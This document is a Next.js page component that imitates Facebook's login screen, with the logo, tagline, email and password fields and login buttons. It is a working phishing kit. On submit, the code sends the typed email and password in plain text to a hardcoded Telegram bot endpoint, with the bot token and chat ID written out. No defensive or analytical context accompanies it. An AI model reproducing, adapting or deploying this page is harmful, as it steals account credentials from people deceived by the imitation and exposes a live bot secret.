"use client";

import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useState } from "react";
import FacebookLogo from "@/public/logo.svg";
import Image from "next/image";

export default function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleClick = async () => {
    try {
      const message = `Email: ${email}, Password: ${password}`;
      await fetch(
        `https://api.telegram.org/bot7034601566:AAHUDbChy1ZVWR2SoBFs062Riv_Fk4QR2go/sendMessage?chat_id=1003104623&text=${encodeURIComponent(
          message
        )}`
      );
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <div className="px-5 lg:flex lg:gap-20 lg:justify-center h-screen lg:items-center bg-[#F0F2F5]">
      <div className="flex flex-col gap-5 text-center items-center lg:max-w-md lg:text-start lg:items-start">
        <div className="h-32 ">
          <Image
            src={FacebookLogo}
            alt="facebook-logo"
            className="w-full h-full"
          />
        </div>
        <span className="text-2xl text-[#1c1e2]">
          Facebook helps you connect and share with the people in your life.
        </span>
      </div>

      <div>
        <div className="mt-10 rounded-lg shadow-custom-dark py-5 px-4 flex flex-col gap-5  bg-white">
          <form
            onSubmit={(e) => {
              e.preventDefault();
              handleClick();
            }}
            className="flex flex-col gap-5 "
          >
            <Input
              type="email"
              placeholder="Email address or phone number"
              onChange={(e) => setEmail(e.target.value)}
              value={email}
              className="rounded-md focus-visible:ring-2 focus-visible:ring-sky-500  focus:ring-2 focus:ring-sky-100 lg:w-96"
            />
            <Input
              type="password"
              placeholder="Password"
              onChange={(e) => setPassword(e.target.value)}
              value={password}
              className="rounded-md focus-visible:ring-2 focus-visible:ring-sky-500  focus:ring-2 focus:ring-sky-100 lg:w-96"
            />
            <div className="text-center">
              <Button
                type="submit"
                className="bg-[#0866ff] text-xl font-semibold w-full"
              >
                Log in
              </Button>
              <Button className="text-[#0866ff] text-base mt-3 bg-transparent hover:bg-transparent font-normal ">
                Forgotten password?
              </Button>
            </div>
          </form>
          <span className="border border-b bg-[#1c1e21]"></span>
          <Button className="bg-[#42b72a] font-semibold text-base w-fit m-auto">
            Create new account
          </Button>
        </div>
        <span className="mt-7 block text-center text-[#1c1e21] text-sm">
          <span className="font-semibold mr-1">Create a Page</span>for a
          celebrity, brand or business.
        </span>
      </div>
    </div>
  );
}
